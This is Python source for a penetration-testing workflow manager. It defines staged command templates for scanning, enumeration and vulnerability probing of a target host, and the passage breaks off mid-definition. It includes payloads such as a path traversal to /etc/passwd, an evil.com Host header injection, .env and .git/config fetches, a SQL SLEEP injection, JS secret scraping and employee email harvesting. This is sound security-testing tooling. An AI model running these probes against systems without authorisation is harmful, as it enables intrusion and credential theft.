"""
Pentest Workflow Manager v4 — app.py
Extended: API vuln detection (OWASP API Top-10), Database vuln scanning,
verified findings, fixed PDF report with PoC + code-fix examples,
enriched popup data (path, command, remediation).
"""

import os, re, uuid, json, time, queue, threading, subprocess, shutil, html, socket, signal, ipaddress, select, urllib.request, urllib.parse, math as _math, inspect
from datetime import datetime
from flask import Flask, request, Response, jsonify, send_file
from reportlab.lib.pagesizes import A4
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import cm
from reportlab.lib import colors
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle,
    HRFlowable, PageBreak, Preformatted, KeepTogether
)
from reportlab.lib.enums import TA_LEFT, TA_CENTER

app = Flask(__name__)
app.secret_key = os.environ.get('PWM_SECRET_KEY') or os.urandom(24)
app.config['MAX_CONTENT_LENGTH'] = 1024 * 1024  # 1 MiB request body cap
PWM_API_TOKEN = os.environ.get('PWM_API_TOKEN', '')
PWM_BIND = os.environ.get('PWM_BIND', '127.0.0.1')
PWM_PORT = int(os.environ.get('PWM_PORT', '5000'))
PWM_CMD_TIMEOUT = os.environ.get('PWM_CMD_TIMEOUT', '0')
try:
    PWM_CMD_TIMEOUT = float(PWM_CMD_TIMEOUT)
except (TypeError, ValueError):
    PWM_CMD_TIMEOUT = 0.0
if PWM_CMD_TIMEOUT < 0:
    PWM_CMD_TIMEOUT = 0.0
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

@app.before_request
def _api_token_gate():
    if PWM_API_TOKEN and request.path.startswith('/api/'):
        if request.headers.get('X-API-Token') != PWM_API_TOKEN:
            return jsonify(error='Unauthorized'), 401

sessions: dict = {}
output_queues: dict = {}

# ─────────────────────────────────────────────────────────────────────────────
# KILL CHAIN DEFINITION
# ─────────────────────────────────────────────────────────────────────────────
CHAIN = [
    {
        "id": "recon", "label": "Stage 1 — Reconnaissance",
        "color": "blue", "icon": "01", "parallel": False,
        "substages": [
            {
                "id": "recon_ports", "label": "Port & Service Scan", "tool": "nmap / masscan",
                "description": "Full TCP port scan (all 65535 ports at fast rate) then light version detection on open ports only. Uses SYN scan when run with privileges, TCP connect scan otherwise.",
                "cmd_template": "nmap -p- --min-rate 1000 --max-rate 3000 -T4 --open -oG {outdir}/nmap_full.gnmap {target} 2>&1; echo '---SERVICE SCAN---'; PORTS=$(grep -oE '[0-9]+/open/tcp' {outdir}/nmap_full.gnmap 2>/dev/null | cut -d/ -f1 | sort -un | tr '\n' ',' | sed 's/,$//'); if [ -n \"$PORTS\" ]; then nmap -sV --version-light --max-retries 1 -p \"$PORTS\" -T4 {target} 2>&1; else echo 'No open TCP ports found'; fi",
                "fallback_cmd": "nmap -sV --version-light --open -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,6379,8080,8443,9200,27017 -T4 -oN {outdir}/nmap_common.txt {target} 2>&1",
                "parse": "nmap",
            },
            {
                "id": "recon_udp", "label": "UDP Top-20 Probe", "tool": "nmap -sU",
                "description": "UDP scan for SNMP, DNS, TFTP, NTP, LDAP and other UDP services.",
                "cmd_template": "timeout -k 5 90 nmap -sU --open -p 53,67,68,69,123,137,138,161,162,389,500,514,623,1194,5353 -T4 -oN {outdir}/nmap_udp.txt {target} 2>&1",
                "fallback_cmd": "python3 -c \"import socket\nsvc={53:'domain',67:'dhcp',68:'dhcp',69:'tftp',123:'ntp',137:'netbios-ns',138:'netbios-dgm',161:'snmp',162:'snmptrap',389:'ldap',500:'isakmp',514:'syslog',623:'ipmi',1194:'openvpn',5353:'mdns'}\nfor p in [53,67,68,69,123,137,138,161,162,389,500,514,623,1194,5353]:\n s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\n s.settimeout(1)\n try:\n  s.connect(('{target}',p)); s.send(b''); s.recv(1)\n  print(str(p)+'/udp open '+svc.get(p,'unknown'))\n except socket.timeout:\n  print(str(p)+'/udp open|filtered')\n except ConnectionRefusedError:\n  print(str(p)+'/udp closed')\n except OSError:\n  print(str(p)+'/udp error')\n finally:\n  s.close()\"",
                "parse": "nmap", "requires_root": True,
            },
            {
                "id": "recon_dns", "label": "DNS Enumeration", "tool": "dig / dnsrecon / dnsx",
                "description": "Zone transfer attempt, NS/MX/TXT records, DMARC, wildcard detection, standard DNS enumeration (SOA/NS/A/AAAA/MX/SRV).",
                "cmd_template": "dig +nocmd {target} ANY +multiline +noall +answer 2>&1; host -t ns {target} 2>&1; host -t mx {target} 2>&1; host -t txt {target} 2>&1; dig axfr {target} 2>&1 | head -40; echo '---DMARC---'; dig _dmarc.{target} TXT 2>&1; echo '---WILDCARD---'; dig test.{target} A 2>&1 | head -5; echo '---DNSRECON---'; dnsrecon -d {target} -t std,axfr --xml {outdir}/dnsrecon.xml 2>&1 | head -60",
                "fallback_cmd": "dig +nocmd {target} ANY +multiline +noall +answer 2>&1; host -t ns {target} 2>&1; host -t mx {target} 2>&1; dig axfr {target} 2>&1 | head -40",
                "parse": "generic",
            },
            {
                "id": "recon_web", "label": "HTTP/S Fingerprint", "tool": "curl / whatweb",
                "description": "Banner grab, redirect chain, server headers, X-Powered-By, CSP, CORS, cookie flags, WAF detection, technology stack.",
                "cmd_template": "curl -sIL --max-time 8 http://{target} 2>&1; echo '=HTTPS='; curl -skIL --max-time 8 https://{target} 2>&1; curl -skI --max-time 8 http://{target}:8080 2>&1; curl -skI --max-time 8 https://{target}:8443 2>&1; echo '=DISCOVERED PORTS='; for p in $(echo \"{ports}\" | tr ',' '\\n' | grep -vE '^(80|443|8080|8443)$' | head -8); do [ -z \"$p\" ] && continue; echo \"--- HTTP on :$p ---\"; curl -skI --max-time 3 \"http://{target}:$p\" 2>&1 | head -8; done; echo '=WHATWEB='; timeout -k 5 60 whatweb -a 1 http://{target} 2>&1 | head -20; echo '=WAF='; timeout -k 5 45 wafw00f http://{target} 2>&1 | head -15",
                "fallback_cmd": "curl -sIL --max-time 8 http://{target} 2>&1; curl -skIL --max-time 8 https://{target} 2>&1",
                "parse": "headers",
            },
            {
                "id": "recon_smb", "label": "SMB / RPC / NetBIOS Enumeration", "tool": "smbclient / enum4linux",
                "description": "NetBIOS lookup, null-session share listing, domain/user enumeration, SMB signing check.",
                "cmd_template": "nmblookup -A {target} 2>&1; smbclient -L //{target} -N 2>&1; rpcclient -U '' -N {target} -c 'srvinfo; enumdomusers; enumdomgroups; getdompwinfo' 2>&1; echo '---ENUM4LINUX---'; enum4linux -a {target} 2>&1 | head -80; echo '---SMB SIGNING---'; nmap --script=smb2-security-mode -p 445 {target} 2>&1 | head -20",
                "fallback_cmd": "nmblookup -A {target} 2>&1; smbclient -L //{target} -N 2>&1",
                "parse": "smb",
            },
            {
                "id": "recon_osint", "label": "WHOIS / ASN / OSINT / Subdomain", "tool": "whois / theHarvester",
                "description": "Registration data, ASN, certificate transparency logs, email harvesting, subdomain enumeration.",
                "cmd_template": "timeout -k 5 30 whois {target} 2>&1 | head -70; echo '---CRT.SH---'; case {target} in *[a-zA-Z]*) if command -v crt.sh >/dev/null 2>&1; then (cd {outdir} && timeout -k 5 60 crt.sh -d {target}) 2>/dev/null | tail -n +8 | head -80; else curl -s --max-time 8 'https://crt.sh/?q=%25.{target}&output=json' 2>/dev/null | python3 -c \"import json,sys; d=json.load(sys.stdin); [print(x.get('name_value','')) for x in d[:30]]\" 2>/dev/null || echo 'crt.sh unavailable'; fi;; *) echo '[crt.sh skipped — IP target]';; esac; echo '---THEHARVESTER---'; if command -v theHarvester >/dev/null 2>&1; then timeout -k 5 120 theHarvester -d {target} -b baidu,yahoo,dnsdumpster,certspotter,crtsh,hackertarget,rapiddns -l 100 2>&1 | head -60; else echo '[theHarvester not installed — skipped]'; fi",
                "fallback_cmd": "timeout -k 5 30 whois {target} 2>&1 | head -70; curl -s --max-time 8 'https://crt.sh/?q=%25.{target}&output=json' 2>/dev/null | python3 -c \"import json,sys; d=json.load(sys.stdin); [print(x.get('name_value','')) for x in d[:30]]\" 2>/dev/null || echo 'unavailable'",
                "parse": "generic",
            },
            {
                "id": "recon_waf_cdn", "label": "WAF / CDN / Load Balancer Detection", "tool": "wafw00f / nmap",
                "description": "Detect Web Application Firewalls, CDN providers, load balancers and cloud platform indicators.",
                "cmd_template": "timeout -k 5 45 wafw00f -a http://{target} 2>&1; timeout -k 5 45 wafw00f -a https://{target} 2>&1; echo '---NMAP WAF NSE---'; timeout -k 5 60 nmap --script=http-waf-detect,http-waf-fingerprint -p 80,443 {target} 2>&1 | head -30; echo '---CLOUDFLARE CHECK---'; curl -skI --max-time 8 https://{target} 2>&1 | grep -iE 'cf-ray|x-cdn|via|x-cache|x-amz|x-azure|server' | head -10",
                "fallback_cmd": "curl -skI --max-time 8 http://{target} 2>&1 | grep -iE 'server|via|x-powered|x-cache'",
                "parse": "waf",
            },
            {
                "id": "recon_subdomains", "label": "Subdomain Enumeration", "tool": "dnsrecon / crt.sh / dig",
                "description": "Passive subdomain gathering (ct logs, search engines) plus a brute-force pass, then validating which candidates actually resolve to A records. The parser only reports subdomains that resolved.",
                "cmd_template": "echo '=CRT.SH='; case {target} in *[a-zA-Z]*) curl -s --max-time 12 'https://crt.sh/?q=%25.{target}&output=json' 2>/dev/null | python3 -c \"import json,sys\ntry:\n d=json.load(sys.stdin)[:80]\nexcept Exception:\n d=[]\nfor x in d:\n print(x.get('name_value',''))\" 2>/dev/null || echo '[crt.sh unavailable]';; *) echo '[crt.sh skipped — IP target]';; esac; echo '=DNSRECON='; if command -v dnsrecon >/dev/null 2>&1; then timeout -k 5 90 dnsrecon -d {target} -t std,brt -D /usr/share/wordlists/dnsrecon/top-level-names.txt 2>&1 | grep -iE 'A |CNAME|NS |SOA ' | head -50; else echo '[dnsrecon not installed]'; fi; echo '=RESOLVED SUBS='; for s in www api dev admin mail vpn portal staging app test beta m login dashboard; do ip=$(dig +short $s.{target} A 2>/dev/null | head -1); if [ -n \"$ip\" ]; then echo \"$s.{target} -> $ip\"; fi; done",
                "fallback_cmd": "echo '=RESOLVED SUBS='; for s in www api dev admin mail; do ip=$(dig +short $s.{target} A 2>/dev/null | head -1); [ -n \"$ip\" ] && echo \"$s.{target} -> $ip\"; done",
                "parse": "subdomains",
            },
            {
                "id": "recon_osint_passive", "label": "Passive OSINT", "tool": "whois / RIPE / geoip",
                "description": "Registration data, ASN/organisation, routing visibility and geolocation context for the target. Information-only — never a vulnerability claim on its own.",
                "cmd_template": "echo '=WHOIS='; timeout -k 5 30 whois {target} 2>&1 | grep -iE 'registrant|org-name|organization|netname|descr|country|abuse-c|created:|expires:' | head -20; echo '=ROUTING PREFIX='; timeout -k 5 20 python3 -c \"import json,urllib.request\ntry:\n d=json.load(urllib.request.urlopen('https://stat.ripe.net/data/prefix/data.json?resource={target}',timeout=6))\n p=(d.get('data',{}) or {}).get('prefixes')\n print('prefix:', p[0].get('prefix') if p else 'none')\nexcept Exception:\n print('prefix: unknown')\"; echo '=GEOIP='; timeout -k 5 15 python3 -c \"import json,urllib.request\ntry:\n d=json.load(urllib.request.urlopen('https://ipwho.is/{target}',timeout=6))\n print('country:',d.get('country'))\n print('org:',d.get('connection',{}).get('org'))\nexcept Exception:\n print('geoip: unavailable')\"",
                "fallback_cmd": "timeout -k 5 30 whois {target} 2>&1 | grep -iE 'org-name|netname|descr|country' | head -15",
                "parse": "generic",
            },
            {
                "id": "recon_breach_osint", "label": "Employee / Email Breach OSINT", "tool": "theHarvester / HIBP",
                "description": "Harvests employee emails via theHarvester (written to {outdir}/theharvester_emails.txt). If PWM_HIBP_KEY is set, each unique address is checked against Have I Been Pwned; a COMPROMISED finding is only emitted for a real 200 breach response.",
                "cmd_template": "mkdir -p {outdir}/osint; if command -v theHarvester >/dev/null 2>&1; then timeout -k 5 120 theHarvester -d {target} -b baidu,bing,dnsdumpster,crtsh,hackertarget -l 300 2>&1 | tee {outdir}/theharvester_emails.txt | sed -n '/Emails found/,$p' | grep -oiE '[a-z0-9._%+-]+@[a-z0-9.-]+' | sort -u | head -40; else echo '[theHarvester not installed]'; fi; echo '=HIBP CHECK='; if [ -n \"$PWM_HIBP_KEY\" ]; then python3 -c \"import os,re,urllib.request,urllib.error,json\nkey=os.environ.get('PWM_HIBP_KEY'); em=[]\ntry:\n for line in open('{outdir}/theharvester_emails.txt',errors='ignore'):\n  em += re.findall(r'[a-z0-9._%+-]+@[a-z0-9.-]+',line)\nexcept Exception:\n pass\nfor e in list(dict.fromkeys(em))[:15]:\n try:\n  req=urllib.request.Request('https://haveibeenpwned.com/api/v3/breachedaccount/'+e,headers={'hibp-api-key':key,'user-agent':'pwm-osint'})\n  r=urllib.request.urlopen(req,timeout=10)\n  d=json.load(r)\n  if isinstance(d,list) and d: print('COMPROMISED:'+e+'|'+','.join((x.get('Name') or '') for x in d[:5]))\n  else: print('NO_BREACH:'+e)\n except urllib.error.HTTPError as he:\n  if he.code==404: print('NO_BREACH:'+e)\n  else: print('HIBP_ERROR:'+e+'|http_'+str(he.code))\n except Exception as ex:\n  print('HIBP_ERROR:'+e+'|'+str(ex)[:60])\n\"; else echo '[PWM_HIBP_KEY not set — breach lookup skipped; discovery only]'; fi",
                "fallback_cmd": "echo '[theHarvester not available — no email OSINT run]'",
                "parse": "breach_osint",
            },
            {
                "id": "recon_js_leak", "label": "JS / Endpoint Leakage", "tool": "python / curl",
                "description": "Crawls script references on the app, downloads each JS bundle, and extracts API endpoints. Emits a high finding ONLY when a real secret pattern (AWS/stripe/GitHub/GCP/slack/JWT/private key/password) is present in bundle content.",
                "cmd_template": "python3 - <<'PY'\nimport urllib.request,re\nhtml=''\nfor page in ('/', '/spa'):\n    try:\n        html+=urllib.request.urlopen('http://{target}'+page,timeout=8).read().decode('utf-8','ignore')\n    except Exception:\n        pass\nscripts=re.findall(r'''<script[^>]+src=[\"']([^\"']+)[\"']''',html)\nscripts=[s for s in scripts if s.endswith('.js')][:12]\njs=''\nfor s in scripts:\n    u2=s if s.startswith('http') else ('http://{target}'+s if s.startswith('/') else 'http://{target}/'+s)\n    try:\n        js+=urllib.request.urlopen(u2,timeout=6).read().decode('utf-8','ignore')+'\\n'\n    except Exception:\n        pass\nprint('=====JS-SRC-LIST=====')\nfor s in scripts: print(s)\nprint('=====JS-ENDPOINTS=====')\npat=r'''[\"']((?:/|https?://)[A-Za-z0-9_\\-\\./]*(?:/api/|/v1/|/v2/|/graphql|/rest|/wp-json|/upload|/download|/assets)[A-Za-z0-9_\\-\\./]*)[\"']'''\nfor m in sorted(set(re.findall(pat,js)))[:40]: print(m)\nprint('=====JS-SECRETS=====')\npats=[(r'sk_[A-Za-z0-9_]{20,}','stripe'),(r'AKIA[0-9A-Z]{16}','aws'),(r'ghp_[A-Za-z0-9]{30,}','github'),(r'AIza[0-9A-Za-z_-]{30,}','gcp'),(r'xox[baprs]-[A-Za-z0-9-]{10,}','slack'),(r'(eyJ[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}\\.)[A-Za-z0-9_-]{10,}','jwt'),(r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----','private_key'),(r'password\\?\\s*[:=]\\s*[\"\\']([^\"\\']{6,})[\"\\']','password')]\nfor pat,name in pats:\n    for m in list(set(re.findall(pat,js)))[:5]:\n        v=m if isinstance(m,str) else (m[-1] if m[-1] else m[0])\n        print('SECRET:'+name+':'+(v[:70] if v else ''))\nprint('=====SOURCEMAP=====')\nfor s in scripts[:8]:\n    u2=s if s.startswith('http') else ('http://{target}'+s if s.startswith('/') else 'http://{target}/'+s)\n    try:\n        b=urllib.request.urlopen(u2+'.map',timeout=6).read()\n        if b[:1]==b'{': print('MAP:'+u2+'.map')\n    except Exception:\n        pass\nPY",
                "fallback_cmd": "echo 'JS_SCAN_ERROR: no python3 urllib available'",
                "parse": "js_leak",
            },
            {
                "id": "recon_version_cve", "label": "Service Version → NVD CVE Cross-Reference", "tool": "nmap -sV / NVD API",
                "description": "Re-runs light version detection, then each service/version pair is looked up as an exact CPE against the NVD cpeName API (verified vectors only, never keyword guesses). CVE findings carry the real NVD vector.",
                "cmd_template": "nmap -sV --version-light --max-retries 1 -p {ports} -T4 -oN {outdir}/nmap_versions.txt {target} 2>&1 | grep -iE '^[0-9]+/tcp.*open' | head -40",
                "fallback_cmd": "echo 'NO_NMAP'",
                "parse": "version_cve",
            },
            {
                "id": "recon_tech", "label": "Web Stack / Technology Fingerprint", "tool": "whatweb / nuclei",
                "description": "Fingerprint the web stack — server, CMS, framework, libraries — via whatweb level-3 and the nuclei technologies template set. Emits informational technology findings only.",
                "cmd_template": "echo '=WHATWEB='; if command -v whatweb >/dev/null 2>&1; then timeout -k 5 60 whatweb -a 3 http://{target} 2>&1 | head -30; else echo '[whatweb not installed]'; fi; echo '=NUCLEI TECHNOLOGIES='; if command -v nuclei >/dev/null 2>&1; then timeout -k 5 120 nuclei -u http://{target} -t /home/spidersecops/.local/nuclei-templates/http/technologies -silent 2>&1 | head -60; else echo '[nuclei not installed]'; fi",
                "fallback_cmd": "curl -skIL --max-time 8 http://{target} 2>&1 | head -30",
                "parse": "tech",
            },
            {
                "id": "recon_nuclei", "label": "Nuclei Exposure & Misconfig Recon", "tool": "nuclei",
                "description": "Scan against exposures, misconfiguration, exposed-panels and token-spray templates only — recon-grade detection feeding later verification.",
                "cmd_template": "if command -v nuclei >/dev/null 2>&1; then timeout -k 5 180 nuclei -u http://{target} -t /home/spidersecops/.local/nuclei-templates/http/exposures -t /home/spidersecops/.local/nuclei-templates/http/misconfiguration -t /home/spidersecops/.local/nuclei-templates/http/exposed-panels -t /home/spidersecops/.local/nuclei-templates/http/token-spray -severity critical,high,medium -silent -o {outdir}/nuclei_recon.txt 2>&1 | head -80; else echo '[nuclei not installed]'; fi",
                "fallback_cmd": "echo '[nuclei not installed]'",
                "parse": "nuclei",
            },
            {
                "id": "recon_content", "label": "Content Discovery", "tool": "ffuf / gobuster",
                "description": "Directory/file discovery with ffuf and gobuster wordlists. Findings are informational paths — never vulnerabilities by status alone. 3xx statuses are explicitly ignored for vuln claims.",
                "cmd_template": "echo '=GOBUSTER='; if command -v gobuster >/dev/null 2>&1; then gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t 40 -q --no-error -x php,txt,bak,bak2,sql,zip,tar.gz,conf,xml,json,log,env -o {outdir}/gobuster_recon.txt 2>&1 | head -80; else echo '[gobuster not installed]'; fi; echo '=FFUF='; if command -v ffuf >/dev/null 2>&1; then ffuf -u 'http://{target}/FUZZ' -w /usr/share/wordlists/dirb/common.txt -mc 200,201,202,204,301,302,307,308,401,403 -fc 404 -t 40 2>&1 | grep -viE 'INFO|WARNING' | head -60; else echo '[ffuf not installed]'; fi",
                "fallback_cmd": "echo '[content discovery tools not available]'",
                "parse": "dirb",
            },
            {
                "id": "recon_ad_enum", "label": "Active Directory Enumeration", "tool": "ldapsearch / nmap NSE",
                "description": "Attempts an anonymous LDAP base query and common default naming contexts, plus nmap NSE for LDAP/Kerberos/SMB. Anything reported is gated on the service actually responding with directory data.",
                "cmd_template": "echo '=LDAP BASE='; if command -v ldapsearch >/dev/null 2>&1; then timeout -k 5 20 ldapsearch -x -H ldap://{target} -s base namingContexts 2>&1 | head -15 || echo '[ldap bind failed]'; else echo '[ldapsearch not installed]'; fi; echo '=DEFAULT CONTEXTS='; if command -v ldapsearch >/dev/null 2>&1; then for dc in 'DC=corp,DC=local' 'DC=ad,DC=corp,DC=local' 'DC=domain,DC=local'; do timeout -k 3 8 ldapsearch -x -H ldap://{target} -b \"$dc\" -s base dn 2>&1 | head -4; done; fi; echo '=NSE LDAP='; timeout -k 5 40 nmap --script=ldap-rootdse,ldap-search,ldap-anonymous -p 389,636,88,3268,3269 {target} 2>&1 | head -40",
                "fallback_cmd": "echo '[ad enum unavailable]'",
                "parse": "ad_enum",
            },
            {
                "id": "recon_cloud", "label": "Cloud / CDN Misconfig Baseline", "tool": "curl / python",
                "description": "Provider and CDN header fingerprinting plus cloud well-known endpoint checks. Emits informational provider findings from real header evidence only.",
                "cmd_template": "echo '=PROVIDER HEADERS (HTTP)='; curl -skI --max-time 8 http://{target} 2>&1 | grep -iE 'server|x-amz-|x-azure-|x-gcs-|x-goog-|via|x-sucuri|x-cld-|cf-ray|x-host' | head -12; echo '=PROVIDER HEADERS (HTTPS)='; curl -skI --max-time 8 https://{target} 2>&1 | grep -iE 'server|x-amz-|x-azure-|x-gcs-|x-cf-|via|cf-ray' | head -8; echo '=CLOUD WELL-KNOWN='; for u in .well-known/openid-configuration .well-known/security.txt robots.txt; do code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 4 'http://{target}/'$u); echo \"$u -> $code\"; done",
                "fallback_cmd": "curl -skI --max-time 8 http://{target} 2>&1 | grep -iE 'server|x-amz-|cf-ray|via' | head -8",
                "parse": "cloud",
            },
        ],
    },
    {
        "id": "vuln", "label": "Stage 2 — Vulnerability Analysis",
        "color": "amber", "icon": "02", "parallel": True,
        "substages": [
            {
                "id": "vuln_cve", "label": "CVE / Vulners + Vulscan", "tool": "nmap vulners / vulscan",
                "description": "Map each open service version to CVE database via nmap vulners and vulscan NSE scripts. Dual CVE source for broader coverage.",
                "cmd_template": "nmap -sV --script=vulners --script-args mincvss=4.0 -p {ports} -T4 {target} 2>&1; echo '---VULSCAN---'; nmap -sV --script=vulscan/vulscan.nse --script-args vulscandb=scipvuldb.csv -p {ports} -T4 {target} 2>&1 | grep -E 'CVE|vuln|CVSS' | head -40",
                "fallback_cmd": "nmap -sV --script=vulners --script-args mincvss=4.0 -p {ports} -T4 {target} 2>&1",
                "parse": "vulners",
            },
            {
                "id": "vuln_nuclei", "label": "Nuclei Template Scan", "tool": "nuclei",
                "description": "Fast template-based vulnerability scanner covering CVEs, misconfigs, exposures, default-logins and takeovers.",
                "cmd_template": "nuclei -u http://{target} -severity critical,high,medium -t cves/ -t vulnerabilities/ -t misconfiguration/ -t exposures/ -t default-logins/ -t takeovers/ -o {outdir}/nuclei.txt -rate-limit 50 2>&1 | head -80",
                "fallback_cmd": "echo '[nuclei not installed] Install: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest'",
                "parse": "nuclei",
            },
            {
                "id": "vuln_searchsploit", "label": "ExploitDB Lookup", "tool": "searchsploit",
                "description": "Search offline ExploitDB for each discovered service banner.",
                "cmd_template": "searchsploit --colour {banner_search} 2>&1 | head -60",
                "parse": "searchsploit",
            },
            {
                "id": "vuln_web_dirs", "label": "Web Directory & File Brute", "tool": "gobuster / ffuf",
                "description": "Enumerate hidden directories, admin panels, config files, backup files, API paths.",
                "cmd_template": "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t 60 -q --no-error -x php,asp,aspx,jsp,txt,bak,conf,xml,json,sql,log,zip,tar.gz -o {outdir}/gobuster.txt 2>&1 | head -80; echo '---FFUF FUZZ---'; ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,201,301,302,401,403 -t 50 -o {outdir}/ffuf.json 2>&1 | grep -v INFO | head -40",
                "fallback_cmd": "dirb http://{target} /usr/share/wordlists/dirb/common.txt -S 2>&1 | head -80",
                "parse": "dirb",
            },
            {
                "id": "vuln_nikto", "label": "Nikto Web Audit", "tool": "nikto",
                "description": "Checks 6700+ dangerous files, outdated software, misconfigs, XSS, SQLi indicators.",
                "cmd_template": "nikto -h {target} -maxtime 90 -Tuning 1234567890abcde 2>&1 | head -120",
                "parse": "nikto",
            },
            {
                "id": "vuln_ssl", "label": "TLS / SSL Deep Check", "tool": "sslscan / testssl",
                "description": "Cipher suites, certificate chain, Heartbleed, POODLE, ROBOT, CRIME, BEAST, SWEET32.",
                "cmd_template": "sslscan --no-colour {target}:443 2>&1 | head -80; echo '---OPENSSL---'; echo '' | openssl s_client -connect {target}:443 -servername {target} 2>&1 | head -50; echo '---TESTSSL---'; if command -v testssl.sh >/dev/null 2>&1; then testssl.sh --fast --quiet {target} 2>&1 | head -60; else echo '[testssl.sh not installed — skipped]'; fi",
                "fallback_cmd": "echo '' | openssl s_client -connect {target}:443 -servername {target} 2>&1 | head -60",
                "parse": "ssl",
            },
            {
                "id": "vuln_snmp", "label": "SNMP Community Probe", "tool": "onesixtyone / snmpwalk",
                "description": "Default and custom community strings, full MIB walk on success, SNMP version detection.",
                "cmd_template": "onesixtyone -c /usr/share/doc/onesixtyone/dict.txt {target} 2>&1; snmpwalk -v2c -c public -t 5 {target} 1.3.6.1.2.1.1 2>&1 | head -30; snmpwalk -v2c -c public {target} 1.3.6.1.2.1.25 2>&1 | head -20; echo '---SNMP v3---'; nmap --script=snmp-info,snmp-processes,snmp-interfaces -p 161 {target} 2>&1 | head -40",
                "parse": "snmp",
            },
            {
                "id": "vuln_smtp_ldap", "label": "SMTP / LDAP / FTP Audit", "tool": "nmap NSE",
                "description": "SMTP open relay, user enumeration, LDAP anonymous bind, FTP anonymous login and version checks.",
                "cmd_template": "echo '---SMTP---'; nmap --script=smtp-commands,smtp-enum-users,smtp-open-relay,smtp-vuln-cve2010-4344 -p 25,465,587 {target} 2>&1 | head -40; echo '---LDAP---'; nmap --script=ldap-rootdse,ldap-search,ldap-brute -p 389,636 {target} 2>&1 | head -30; echo '---FTP---'; nmap --script=ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor,ftp-proftpd-backdoor -p 21 {target} 2>&1 | head -30",
                "parse": "nse_deep",
            },
            {
                "id": "vuln_evidence", "label": "Evidence Capture — Screenshot / PCAP", "tool": "chromium / tcpdump",
                "description": "For every scorable finding (critical/high/medium with a reachable http endpoint), a headless-chrome screenshot and a tcpdump PCAP of a short re-probe are captured into {outdir}/evidence. Evidence is attached to the finding; captures that fail are reported, not fabricated.",
                "cmd_template": "echo 'evidence capture substage (in-process)'",
                "parse": "evidence",
            },
            {
                "id": "vuln_assess", "label": "CVSS Scoring & False-Positive Triage", "tool": "in-process",
                "description": "Computes a CVSS v3.1 vector + base score for every finding, assigns an automated triage verdict (confirmed / tool-confirmed / needs_review / info), records the log, and prints a reviewable assessment. Analyst overrides land via POST /api/session/<sid>/triage.",
                "cmd_template": "echo 'assessment substage (in-process)'",
                "parse": "assess",
            },
        ],
    },
    {
        "id": "deep", "label": "Stage 3 — Deep & Zero-Day Analysis",
        "color": "zday", "icon": "03", "parallel": True,
        "substages": [
            {
                "id": "deep_banner_anomaly", "label": "Banner Anomaly Detection", "tool": "nmap NSE",
                "description": "Banner grabs via nmap NSE. Flags version mismatches and unexpected protocol behaviour.",
                "cmd_template": "nmap -sV -p {ports} --script=banner,http-headers,ssh-hostkey --open -T4 {target} 2>&1 | head -80",
                "parse": "banner_anomaly",
            },
            {
                "id": "deep_version_gap", "label": "Version Gap / Unpatched Analysis", "tool": "nmap",
                "description": "Compares discovered service versions against latest known-stable; flags EOL and outdated builds.",
                "cmd_template": "nmap -sV -p {ports} --version-intensity 9 -T4 {target} 2>&1 | grep -E 'open|version' | head -40",
                "parse": "version_gap",
            },
            {
                "id": "deep_http_anomaly", "label": "HTTP Behaviour Anomaly", "tool": "curl probes",
                "description": "Path traversal, verb tampering, host header injection, sensitive file exposure.",
                "cmd_template": "echo '---TRAVERSAL---'; curl -sk --max-time 8 'http://{target}/../../../../etc/passwd' -o - 2>&1 | head -5; echo '---VERB TAMPER---'; curl -skI -X TRACE 'http://{target}/' 2>&1 | head -10; echo '---HOST INJECT---'; curl -skI -H 'Host: evil.com' 'http://{target}/' 2>&1 | head -8; echo '---OPTIONS---'; curl -skI -X OPTIONS 'http://{target}/' 2>&1 | head -8; echo '---ADMIN---'; body=$(curl -skL --max-time 8 -r 0-199 'http://{target}/admin' 2>/dev/null | tr '\\n' ' '); code=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/admin' 2>/dev/null); echo \"body:admin[$code] $body\"; echo '---GIT---'; body=$(curl -skL --max-time 8 -r 0-199 'http://{target}/.git/config' 2>/dev/null | tr '\\n' ' '); code=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/.git/config' 2>/dev/null); echo \"body:.git[$code] $body\"; echo '---ENV---'; body=$(curl -skL --max-time 8 -r 0-199 'http://{target}/.env' 2>/dev/null | tr '\\n' ' '); code=$(curl -skL --max-time 8 -o /dev/null -w '%{http_code}' 'http://{target}/.env' 2>/dev/null); echo \"body:.env[$code] $body\"",
                "parse": "http_anomaly",
            },
            {
                "id": "deep_timing", "label": "Timing / Side-Channel Probe", "tool": "curl timing",
                "description": "Response time variance for blind SQLi, auth oracle, and timing-based info leaks.",
                "cmd_template": "for i in 1 2 3 4 5; do curl -sk -o /dev/null -w \"t=%{time_total} code=%{http_code}\\n\" 'http://{target}/' 2>&1; done; echo '---LOGIN TIMING---'; curl -sk -o /dev/null -w \"valid_user=%{time_total}\\n\" -X POST 'http://{target}/login' -d 'user=admin&pass=wrong' 2>&1; curl -sk -o /dev/null -w \"invalid_user=%{time_total}\\n\" -X POST 'http://{target}/login' -d 'user=zzzinvalid999&pass=wrong' 2>&1; echo '---SQLI SLEEP---'; curl -sk -o /dev/null -w \"sqli_probe=%{time_total}\\n\" 'http://{target}/?id=1+AND+SLEEP(3)' 2>&1; curl -sk -o /dev/null -w \"sqli_baseline=%{time_total}\\n\" 'http://{target}/?id=1' 2>&1",
                "parse": "timing",
            },
            {
                "id": "deep_auth_probe", "label": "Auth & Session Weaknesses", "tool": "curl probes",
                "description": "Session fixation, token flags, default credentials on SSH/FTP/HTTP.",
